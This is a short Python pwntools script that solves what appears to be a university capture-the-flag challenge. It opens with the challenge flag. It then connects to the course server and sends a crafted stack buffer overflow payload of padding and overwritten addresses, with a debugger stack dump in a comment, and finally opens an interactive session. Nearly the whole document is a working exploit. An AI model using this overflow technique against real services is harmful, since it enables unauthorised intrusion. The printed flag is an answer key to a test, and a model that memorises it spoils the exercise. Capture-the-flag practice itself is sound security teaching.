# SSof{You_will_never_guess_a_totally_random_lottery}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22161

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it

"""
0x41414141      0x42424242
0xffffd06c:     0x0802750a      0x00000008      0x0804a000      0xffffd0a8
0xffffd07c:     0x0804885f      0xffffd094      0xffffd094      0x00000008
0xffffd08c:     0x0804881a      0x00000003      0xa6a2cce4
"""
# stack_base = b"\x08\xa0\x04\x08"*2+b"\xa8\xd0\xff\xff"+b"\x5f\x88\x04\x08"
stack_base = b"\x08\xa0\x04\x08"
msg = b'A'*8 + b'B'*8 + stack_base + b'B'*28 + b'A'*8
print(len(msg))
print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

# s.recvall()
s.interactive()

